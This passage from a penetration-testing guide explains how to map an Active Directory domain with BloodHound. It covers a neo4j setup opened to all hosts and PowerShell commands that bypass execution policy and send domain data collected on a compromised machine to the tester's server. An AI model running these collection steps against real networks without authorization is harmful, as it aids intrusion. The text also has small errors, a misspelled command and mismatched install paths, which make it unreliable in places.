### Mapping AD with BloodHound

One of the glorious design features of AD is that everyone in the domain needs to know where everything is. So when you get user credentials and/or a shell, you can basically map the entire domain without breaking any rules. Any user can query Active Directory for computers, domain controllers, groups and sessions.

Now we can use this brilliant feature to collect a ton of information and create a cool GUI map of the entire AD which can be queried using BloodHound. Do the following:

* [Install neo4j](https://neo4j.com/developer/kb/how-do-i-enable-remote-https-access-with-neo4j-30x/) [Community Edition](https://neo4j.com/download/community-edition/) manually from their [website](https://neo4j.com/download/?ref=hro) , not through apt.
* [http://neo4j.com/download/other-releases/\#releases](http://neo4j.com/download/other-releases/#releases)
* [A guide on installing can be found here](https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/)
* Run neo4j from `/opt/neo4j-community-3.3.0/bin/neo4j start`
* Navigate to localhost:7474 in your browser.
* Set a new password for the neo4j account.
* Edit neo4j.conf and set the following parameters to make any host be able to access the database.
  ```
  dbms.connector.http.enabled=true
  dbms.connector.http.listen_address=0.0.0.0:7474
  ```
* Restart neo4j with  `/opt/neo4j-community-3.1.1/bin/neo4j restart`
* Access neo4j in the browser at `http://0.0.0.0:7474/browser/`
* Install BloodHound according to instructions on the [Github page](https://github.com/BloodHoundAD/BloodHound/wiki/Getting-started)

* If on a Mac, Java SDK must be version 8 and not 9 \(neo4j not suppported\). So

* Launch BloodHound and log in to the neo4j database with credentials from before

The old method:

```
powershell -exec bypass
upload /path/bloodhound.ps1
Import-Module ./BloodHound.ps1
Invoke-BloodHound -URI http://SERVER:7474/ -UserPass "user:pass"
```

The new method:

```
scriptimport /path/to/powershell-script.ps1
scrimptcmd Invoke-BloodHound -URI http://SERVER:7474/ -UserPass "user:pass"
```

You should now see data being populated into the database and you can play with BloodHound to create really some really cool maps. You can also perform queries to show the shortest path to DA, etc.

Another method:

```
Powershell -exec bypass
Import-module SharpHound.ps1
Invoke-BloodHound -CollectionMethod ACL,ObjectProps,Default -CompressData –SkipPing
```

### More Bloodhound stuff

https://posts.specterops.io/sharphound-target-selection-and-api-usage-bba517b9e69b

https://github.com/porterhau5/BloodHound

[https://porterhau5.com/blog/representing-password-reuse-in-bloodhound/](https://porterhau5.com/blog/representing-password-reuse-in-bloodhound/)

[https://porterhau5.com/blog/extending-bloodhound-track-and-visualize-your-compromise/](https://porterhau5.com/blog/extending-bloodhound-track-and-visualize-your-compromise/)

http://threat.tevora.com/lay-of-the-land-with-bloodhound/

